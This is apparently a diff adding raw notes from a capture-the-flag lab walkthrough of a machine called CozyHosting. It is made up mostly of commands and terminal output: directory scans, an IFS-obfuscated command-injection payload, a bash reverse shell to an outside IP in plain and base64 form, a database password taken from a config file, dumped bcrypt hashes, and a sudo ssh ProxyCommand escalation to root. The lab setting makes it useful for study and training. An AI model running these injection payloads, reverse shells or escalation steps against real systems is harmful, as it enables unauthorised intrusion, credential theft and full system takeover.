@@ -1,0 +1,171 @@
+sudo nmap -sC -sV 10.10.11.230   
+
+
+sudo feroxbuster -u "http://cozyhosting.htb/"  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -o cozyhosting.ferox -x txt -x html 
+
+
+feroxbuster -u "http://cozyhosting.htb/" \                                                                                                          
+-w /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt \
+-o cozyhosting-springboot.ferox -x txt -x html
+
+
+
+
+
+$(IFS=_;command='curl_http://10.10.16.21:4444';$command)
+
+
+bash -i >& /dev/tcp/10.10.16.21/7777 0>&1
+
+
+echo "bash -i >& /dev/tcp/10.10.16.21/7777 0>&1" | base64 -w 0
+
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yMS83Nzc3IDA+JjEK
+
+;echo${IFS}"payload"|base64${IFS}-d|bash;
+
+
+;echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yMS83Nzc3IDA+JjEK"|base64${IFS}-d|bash;
+
+
+
+
+
+
+after downloading file -
+
+server.address=127.0.0.1
+server.servlet.session.timeout=5m
+management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
+management.endpoint.sessions.enabled = true
+spring.datasource.driver-class-name=org.postgresql.Driver
+spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
+spring.jpa.hibernate.ddl-auto=none
+spring.jpa.database=POSTGRESQL
+spring.datasource.platform=postgres
+spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
+spring.datasource.username=postgres
+spring.datasource.password=Vg&nvzAQ7XxR
+
+
+
+username=postgres
+password=Vg&nvzAQ7XxR
+
+
+
+
+
+app@cozyhosting:/app$ ls
+cloudhosting-0.0.1.jar
+app@cozyhosting:/app$ psql -h 127.0.0.1 -U postgres
+Password for user postgres: 
+psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+Type "help" for help.
+
+postgres=# \c cozyhosting 
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+You are now connected to database "cozyhosting" as user "postgres".
+cozyhosting=# \d
+WARNING: terminal is not fully functional
+Press RETURN to continue 
+              List of relations
+ Schema |     Name     |   Type   |  Owner   
+--------+--------------+----------+----------
+ public | hosts        | table    | postgres
+ public | hosts_id_seq | sequence | postgres
+ public | users        | table    | postgres
+(3 rows)
+
+cozyhosting=# select * from users;
+WARNING: terminal is not fully functional
+Press RETURN to continue 
+   name    |                           password                           | role
+  
+-----------+--------------------------------------------------------------+-----
+--
+ kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
+ admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admi
+n
+(2 rows)
+
+
+
+now identify hash
+
+-$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm - Possible algorithms: bcrypt $2*$, Blowfish (Unix)
+
+
+
+pass- manchesterunited
+
+
+
+──(megatron㉿kali)-[~/Downloads]
+└─$ ssh josh@cozyhosting.htb                     
+The authenticity of host 'cozyhosting.htb (10.10.11.230)' can't be established.
+ED25519 key fingerprint is SHA256:x/7yQ53dizlhq7THoanU79X7U63DSQqSi39NPLqRKHM.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? y
+Please type 'yes', 'no' or the fingerprint: yes
+Warning: Permanently added 'cozyhosting.htb' (ED25519) to the list of known hosts.
+josh@cozyhosting.htb's password: 
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-82-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Oct 21 05:58:08 PM UTC 2023
+
+  System load:           0.0
+  Usage of /:            56.9% of 5.42GB
+  Memory usage:          34%
+  Swap usage:            0%
+  Processes:             269
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.230
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:3e63
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Sat Oct 21 11:37:47 2023 from 10.10.14.25
+josh@cozyhosting:~$ 
+
+
+josh@cozyhosting:~$ ls
+user.txt
+josh@cozyhosting:~$ cat user.txt
+****************************
+
+
+
+
+
+
+NOW CHECK GTFO BIN SSH COMMAND GOOGLE-
+
+
+sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+
+
+josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+[sudo] password for josh: 
+# whoami
+root
+# cat /root/root.txt
+**********************************
+
